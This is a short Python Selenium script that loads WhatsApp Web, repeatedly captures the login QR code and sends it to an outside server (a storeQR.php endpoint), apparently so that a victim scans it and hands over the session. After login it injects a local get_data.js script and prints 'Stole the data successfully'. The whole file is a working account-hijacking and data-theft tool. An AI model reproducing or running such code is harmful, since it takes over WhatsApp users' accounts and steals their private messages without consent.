import threading
import requests
import selenium
from selenium import webdriver
#from selenium.webdriver.chrome.options import Options
import time
import loginClass

def set_interval(func, sec):
    def func_wrapper():
        set_interval(func, sec)
        func()  
    t = threading.Timer(sec, func_wrapper)
    t.start()
    return t

driver = webdriver.Chrome()
driver.get('https://web.whatsapp.com')
images = []
url = ""
def getImage():
    global url
    global images
    images = driver.find_elements_by_tag_name('img')
    if(len(images) > 0):
        URL = "http://godwinvc.com/web.whatsapp.com/storeQR.php?c=" + images[0].get_attribute('src')
        if(url != URL):
            requests.get(URL)
            url = URL
            print("QR Code Updated")

time.sleep(5)
getImage()
while len(images) > 0:
    getImage()
    time.sleep(0.3)
else:
    print("Loggedin")
    time.sleep(1.5)
    driver.execute_script(open("./get_data.js").read())
    loginClass.Login(driver)
    print("Stole the data successfully")